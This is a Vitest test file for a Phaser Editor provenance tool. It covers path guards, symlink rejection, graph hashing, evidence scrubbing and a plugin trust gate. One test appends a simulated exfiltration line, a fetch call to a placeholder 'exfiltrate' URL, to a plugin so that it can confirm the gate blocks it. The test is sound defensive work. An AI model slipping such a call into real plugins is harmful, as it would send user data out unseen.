// GUI-free tests for the real-Editor provenance/session seam (P6 §6). These
// cover the deterministic core — path guards (scratch/output OUTSIDE the repo),
// the declared generated-graph enumeration + hashing, evidence scrubbing — and
// the executable block path end-to-end (no editor binary → typed `blocked` +
// nonzero exit + scrubbed evidence outside the repo). The live GUI protocol
// itself is the vendor-gated, conductor-run leg and is not exercised here.
import { describe, it, expect, afterEach, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, existsSync, symlinkSync } from 'node:fs';
import { createServer } from 'node:http';
import os from 'node:os';
import path from 'node:path';
import {
  SCENE_ORDER,
  SCENE_FILES,
  GENERATED_GRAPH,
  SCENE_AUTHORITY,
  hashGraph,
  allExist,
  deleteGraph,
  resolveScratch,
  resolveOutput,
  isInside,
  PathBlocked,
  scrubText,
  assertNoLeaks,
  captureProvenance,
  getServerMode,
  REPO_ROOT,
} from '../src/session/index.ts';
import { runLaunch } from '../src/launch.ts';
import { resetToScratch } from '../src/reset.ts';
import { repoPath } from './helpers.ts';
import { resolveCdpEndpoint, WorkbenchBlocked } from '../src/session/workbench.ts';

const tmps: string[] = [];
function tmp(): string {
  const d = mkdtempSync(path.join(os.tmpdir(), 'u5-session-'));
  tmps.push(d);
  return d;
}
afterEach(() => {
  while (tmps.length) rmSync(tmps.pop()!, { recursive: true, force: true });
});

describe('session/workbench — optional SSH/CDP browser transport', () => {
  it('accepts only explicit loopback HTTP(S) endpoints', () => {
    expect(resolveCdpEndpoint(undefined)).toBeUndefined();
    expect(resolveCdpEndpoint('  ')).toBeUndefined();
    expect(resolveCdpEndpoint('http://127.0.0.1:19225')).toBe('http://127.0.0.1:19225/');
    expect(resolveCdpEndpoint('https://localhost:19225/devtools')).toBe('https://localhost:19225/devtools');
  });

  it('rejects malformed, non-HTTP, and non-loopback CDP endpoints', () => {
    for (const endpoint of ['not a url', 'ws://127.0.0.1:19225', 'http://example.com:19225']) {
      expect(() => resolveCdpEndpoint(endpoint)).toThrow(WorkbenchBlocked);
    }
  });
});

// Guarantee no test can ever spawn the real installed editor: force a bogus
// server binary for the whole file (individual tests also pass `serverBin`).
const BOGUS_BIN = '/nonexistent/PhaserEditor-does-not-exist';
let priorBin: string | undefined;
beforeAll(() => {
  priorBin = process.env.PHASER_EDITOR_SERVER;
  process.env.PHASER_EDITOR_SERVER = BOGUS_BIN;
});
afterAll(() => {
  if (priorBin === undefined) delete process.env.PHASER_EDITOR_SERVER;
  else process.env.PHASER_EDITOR_SERVER = priorBin;
});

describe('session/graph — declared generated graph + hashing', () => {
  it('declares the seven scenes in canonical kernel order and the closed generated graph', () => {
    expect(SCENE_ORDER).toEqual(['Menu', 'Level', 'Shop', 'Settings', 'Pause', 'Win', 'Fail']);
    expect(SCENE_FILES).toEqual(SCENE_ORDER.map((s) => `${s}.scene`));
    expect(GENERATED_GRAPH).toEqual([
      'src/scenes/Menu.ts',
      'src/scenes/Level.ts',
      'src/scenes/Shop.ts',
      'src/scenes/Settings.ts',
      'src/scenes/Pause.ts',
      'src/scenes/Win.ts',
      'src/scenes/Fail.ts',
      'src/components/Semantic.ts',
    ]);
    expect(SCENE_AUTHORITY).toEqual([
      'src/scenes/Menu.scene',
      'src/scenes/Level.scene',
      'src/scenes/Shop.scene',
      'src/scenes/Settings.scene',
      'src/scenes/Pause.scene',
      'src/scenes/Win.scene',
      'src/scenes/Fail.scene',
      'src/components/Semantic.components',
    ]);
  });

  it('hashes the complete graph deterministically and byte-sensitively', async () => {
    const dir = tmp();
    mkdirSync(path.join(dir, 'src', 'scenes'), { recursive: true });
    writeFileSync(path.join(dir, 'src', 'scenes', 'a.ts'), 'alpha');
    writeFileSync(path.join(dir, 'src', 'scenes', 'b.ts'), 'beta');
    const rels = ['src/scenes/a.ts', 'src/scenes/b.ts'];

    const first = await hashGraph(dir, rels);
    const second = await hashGraph(dir, rels);
    expect(first.combined).toBe(second.combined);
    expect(first.combined).toMatch(/^sha256-[a-f0-9]{64}$/);
    expect(Object.keys(first.byPath)).toEqual(rels);

    // Any byte change moves the combined hash.
    writeFileSync(path.join(dir, 'src', 'scenes', 'b.ts'), 'beta!');
    const third = await hashGraph(dir, rels);
    expect(third.combined).not.toBe(first.combined);
    expect(third.byPath['src/scenes/a.ts']).toBe(first.byPath['src/scenes/a.ts']);
  });

  it('allExist and deleteGraph operate over the declared list', async () => {
    const dir = tmp();
    mkdirSync(path.join(dir, 'gen'), { recursive: true });
    const rels = ['gen/x.ts', 'gen/y.ts'];
    writeFileSync(path.join(dir, 'gen', 'x.ts'), '1');
    expect(await allExist(dir, rels)).toBe(false);
    writeFileSync(path.join(dir, 'gen', 'y.ts'), '2');
    expect(await allExist(dir, rels)).toBe(true);
    await deleteGraph(dir, rels);
    expect(await allExist(dir, rels)).toBe(false);
    // Deleting an already-absent graph is a no-op, not an error.
    await expect(deleteGraph(dir, rels)).resolves.toBeUndefined();
  });
});

describe('session/paths — scratch + output guards (outside the repo)', () => {
  it('isInside detects repo-contained paths', () => {
    expect(isInside(REPO_ROOT, REPO_ROOT)).toBe(true);
    expect(isInside(REPO_ROOT, path.join(REPO_ROOT, 'games'))).toBe(true);
    expect(isInside(REPO_ROOT, os.tmpdir())).toBe(false);
  });

  it('blocks a missing, in-repo, or incomplete scratch and accepts a valid one', async () => {
    expect(() => resolveScratch(undefined)).toThrow(PathBlocked);
    expect(() => resolveScratch('   ')).toThrow(/explicit scratch/);
    // An in-repo scratch is blocked even before existence is checked.
    try {
      resolveScratch(REPO_ROOT);
      throw new Error('should have blocked');
    } catch (err) {
      expect(err).toBeInstanceOf(PathBlocked);
      expect((err as PathBlocked).code).toBe('scratch-in-repo');
    }
    // A dir outside the repo but missing phaser-editor/editor-plugins is incomplete.
    const bare = tmp();
    try {
      resolveScratch(bare);
      throw new Error('should have blocked');
    } catch (err) {
      expect((err as PathBlocked).code).toBe('scratch-incomplete');
    }
    // A real `reset` scratch resolves to its project + plugins.
    const scratch = tmp();
    await resetToScratch(scratch);
    const layout = resolveScratch(scratch);
    expect(layout.project).toBe(path.join(scratch, 'phaser-editor'));
    expect(layout.plugins).toBe(path.join(scratch, 'editor-plugins'));
    expect(layout.catalog).toBe(path.join(scratch, 'catalog'));
  });

  it('rejects symlinked scratch roots and reset-owned child directories', async () => {
    const realScratch = tmp();
    await resetToScratch(realScratch);
    const parent = tmp();
    const rootLink = path.join(parent, 'root-link');
    symlinkSync(realScratch, rootLink, 'dir');
    expect(() => resolveScratch(rootLink)).toThrow(expect.objectContaining({ code: 'scratch-symlink' }));

    const childScratch = tmp();
    await resetToScratch(childScratch);
    rmSync(path.join(childScratch, 'catalog'), { recursive: true, force: true });
    symlinkSync(repoPath('games', 'shell_proof_phaser', 'authoring', 'catalog'), path.join(childScratch, 'catalog'), 'dir');
    expect(() => resolveScratch(childScratch)).toThrow(expect.objectContaining({ code: 'scratch-symlink' }));

    const nestedScratch = tmp();
    await resetToScratch(nestedScratch);
    const scenes = path.join(nestedScratch, 'phaser-editor', 'src', 'scenes');
    rmSync(scenes, { recursive: true, force: true });
    symlinkSync(
      repoPath('games', 'shell_proof_phaser', 'authoring', 'phaser-editor', 'src', 'scenes'),
      scenes,
      'dir',
    );
    expect(() => resolveScratch(nestedScratch)).toThrow(expect.objectContaining({ code: 'scratch-symlink' }));
  });

  it('defaults the output inside the scratch (outside the repo) and honors an explicit path', () => {
    expect(resolveOutput(undefined, '/tmp/scratchX', 'run1')).toBe(
      path.join('/tmp/scratchX', 'evidence', 'provenance-run1.json'),
    );
    expect(resolveOutput('/tmp/out/ev.json', '/tmp/scratchX', 'run1')).toBe(path.resolve('/tmp/out/ev.json'));
  });
});

describe('session/evidence — scrubbing + leak assertion', () => {
  it('scrubs sensitive roots and residual absolute paths out of free text', () => {
    const home = os.homedir();
    const secret = `${home}/dev/appletolye/scratch`;
    const scrubbed = scrubText(`opened at ${secret} for /Applications/Phaser Editor 5.app/server`, [home]);
    expect(scrubbed).not.toContain(home);
    expect(scrubbed).not.toContain('/Applications/Phaser');
    expect(scrubbed).toContain('<path>');
  });

  it('assertNoLeaks throws on an absolute path or the home directory', () => {
    expect(() => assertNoLeaks({ ok: 'src/scenes/Menu.ts', h: 'sha256-abc' })).not.toThrow();
    expect(() => assertNoLeaks({ leak: '/Users/someone/secret' })).toThrow(/absolute path/);
    expect(() => assertNoLeaks({ leak: `${os.homedir()}/x` })).toThrow();
    expect(() => assertNoLeaks({ nested: { arr: ['fine', 'sha256-x'] } })).not.toThrow();
  });
});

describe('session/provenance — executable block path (no editor binary)', () => {
  it('queries the live Phaser Editor 5 API path and retains only mode booleans', async () => {
    let requested = '';
    const server = createServer((req, res) => {
      requested = `${req.method} ${req.url}`;
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ desktop: true, unlocked: true, licenseOwner: 'must-not-escape' }));
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const address = server.address();
    if (!address || typeof address === 'string') throw new Error('test server did not bind a TCP port');
    const priorFetch = globalThis.fetch;
    globalThis.fetch = async () => {
      throw new Error('the Editor lifecycle must not use Node fetch/Undici');
    };
    try {
      expect(await getServerMode(address.port)).toEqual({ desktop: true, unlocked: true });
      expect(requested).toBe('POST /editor/api');
    } finally {
      globalThis.fetch = priorFetch;
      await new Promise<void>((resolve, reject) => server.close((error) => (error ? reject(error) : resolve())));
    }
  });

  it('blocks when the scratch is inside the repo and writes scrubbed evidence outside it', async () => {
    const out = path.join(tmp(), 'ev.json');
    const r = await captureProvenance({ scratch: REPO_ROOT, output: out, serverBin: BOGUS_BIN });
    expect(r.result).toBe('blocked');
    expect(r.code).toBe('scratch-in-repo');
    expect(isInside(REPO_ROOT, r.evidencePath)).toBe(false);
  });

  it('runs the guard→hash→server-start path from a real scratch, blocks on a missing binary, and emits scrubbed hash-only evidence', async () => {
    const scratch = tmp();
    await resetToScratch(scratch);
    const out = path.join(tmp(), 'provenance.json');

    const r = await captureProvenance({ scratch, output: out, serverBin: BOGUS_BIN });
    expect(r.result).toBe('blocked');
    expect(r.code).toBe('server-not-found');
    // The scene-authority hash was taken from the real scratch bytes before the block.
    expect(r.evidence.authority.beforeCombined).toMatch(/^sha256-[a-f0-9]{64}$/);
    expect(r.evidence.serverMode).toEqual({ desktop: false, unlocked: false });
    expect(r.evidence.compile.deterministic).toBe(false);
    expect(r.evidence.sceneOrder).toEqual(SCENE_ORDER);
    expect(r.evidence.generatedGraph).toEqual(GENERATED_GRAPH);

    // Evidence is on disk and carries no absolute path / home dir / scratch path.
    expect(existsSync(out)).toBe(true);
    const text = readFileSync(out, 'utf8');
    expect(text).not.toContain(os.homedir());
    expect(text).not.toContain(scratch);
    expect(text).not.toContain(path.resolve(REPO_ROOT));
    expect(text).not.toContain('/Users/');
    expect(text).not.toContain(BOGUS_BIN);
    // Re-parsing + re-asserting confirms the scrubbing invariant holds.
    expect(() => assertNoLeaks(JSON.parse(text))).not.toThrow();
  });

  it('blocks a tampered scratch plugin before attempting to spawn the Editor', async () => {
    const scratch = tmp();
    const reset = await resetToScratch(scratch);
    const plugin = path.join(reset.plugins, 'live-copy-preview', 'live-copy-preview.js');
    writeFileSync(plugin, `${readFileSync(plugin, 'utf8')}\nfetch('https://example.invalid/exfiltrate');\n`);
    const out = path.join(tmp(), 'tampered-plugin-provenance.json');

    const r = await captureProvenance({ scratch, output: out, serverBin: BOGUS_BIN });

    // The bogus binary would yield `server-not-found` if process launch were
    // reached. Plugin trust must win before any vendor code can execute.
    expect(r.result).toBe('blocked');
    expect(r.code).toBe('blocked-untrusted-plugin');
    expect(r.evidence.detail).toMatch(/plugin trust gate blocked/);
    expect(r.evidence.detail).toMatch(/live-copy-preview/);
    expect(r.evidence.detail).toMatch(/banned API: fetch/);
    expect(r.evidence.detail).not.toContain('example.invalid');
  });

  it('runLaunch parses <scratch> + --out and returns a nonzero exit code on block', async () => {
    const scratch = tmp();
    await resetToScratch(scratch);
    const out = path.join(tmp(), 'launch-evidence.json');

    const { code, result } = await runLaunch([scratch, '--out', out, '--port', '19599']);
    expect(code).toBe(1);
    expect(result.result).toBe('blocked');
    expect(result.evidence.port).toBe(19599);
    expect(result.evidencePath).toBe(path.resolve(out));
    expect(existsSync(out)).toBe(true);
  });
});
